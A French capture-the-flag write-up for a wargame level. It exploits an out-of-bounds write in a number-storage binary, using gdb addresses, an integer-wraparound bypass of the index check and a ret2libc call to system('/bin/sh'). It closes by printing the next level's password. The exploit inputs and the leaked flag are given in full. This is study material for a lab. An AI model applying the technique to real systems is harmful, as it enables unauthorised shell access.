Le binaire level07 nous donne trois choix :

----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Quand on choisit l'option store on va devoir renseigner le nombre a y insérer et l'index.
On va pouvoir entrer un maximum de 100 nombres dans l'espace réservé. Les indexs sont protégé par un %3  mais on va tout de même pouvoir aller écrire a des indexs  sup à 100 et inf à 0.

On va donc de tenter de réecrire sur l'EIP du main renvoyant vers la libc. Pour cela on doit tout d'abors connaitre l'emplacement de l'EIP :

> p $ebp
    $1 = (void *) 0xffffd708 <=== EBP donc EIP ===> 0xffffd70c

On cherche maintenant ou se trouve le début de notre buffer en faisant un store de (int)0x12345 = 74565 à l'index 1 pour le repérer facilement :

(gdb) x/16wx $esp
0xffffd520:     0x08048d4b      0xffffd6d8      0xf7fcfac0      0xf7fdc714
0xffffd530:     0x00000098      0xffffffff      0xffffd7fc      0xffffd7a8
0xffffd540:     0x00000000      0x00000000      0x00012345      0x00000000
0xffffd550:     0x00000000      0x00000000      0x00000000      0x00000000

l'index 1 est à l'adresse 0xffffd548 donc le debut du buffer en 0xffffd544

On soustrait l'adresse du debut du buffer a l'adresse de l'EIP :
0xffffd70c - 0xffffd544 = 0x1C8 = 456

On doit diviser par 4 pour compter en packet de 4 octets (taille des nombres stockés):
456 / 4 = 114.

On va tenter d'écrire un nombre à l'index 114 :

AAAA = 0x41414141 => 1094795585

which has no line number information.
Input command: store
 Number:  1094795585
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command

 On va pouvoir contourner cette protection en utilisant l'overflow de l'unsigned int32:
 UINT32_MAX = [0x ffff ffff] le programme va lire 4294967295
 en ajoutant 1 on obtient [0x 1 0000 0000], le programme va donc lire 0 et le nombre 4294967296 nous permet de passer le %3.
 Sachant  que lors du read et du store, le programme prend l'index que l'on donne et fait << 2 (donc *4), si on veut réécrire sur l'index 0 on doit donner 4294967296 / 4 = 1073741824
 On a donc pu store une valeur a l'index 0 et on pourra faire de même pour l'EIP en faisant :

1 073 741 824(index 0) + 114 = 1073741938 <== index de l'EIP.

On va effectuer un ret2libc en faisant remplacant l'EIP par la fonction system avec "/bin/sh" en paramètre, pour cela on doit trouver l'adresse de système et l'adresse d'une string "/bin/sh" dans la libc:

> p system
    0xf7e6aed0 <system> => 4159090384

Pour trouver l'adresse d'une string correspondante à "/bin/sh" on utilise :

(gdb) info proc map
process 1666
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        [0xf7e2c000] 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fd8000 0xf7fdb000     0x3000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
 
 (gdb) find 0xf7e2c000, +99999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh" => 4160264172

On a donc notre EIP notre adresse de la fonction system et notre string "/bin/sh" :

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 1094795585
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

On store à l'index 114 l'adresse de système
On store à l'index 115 AAAA
On store à l'index 116 "/bin/sh"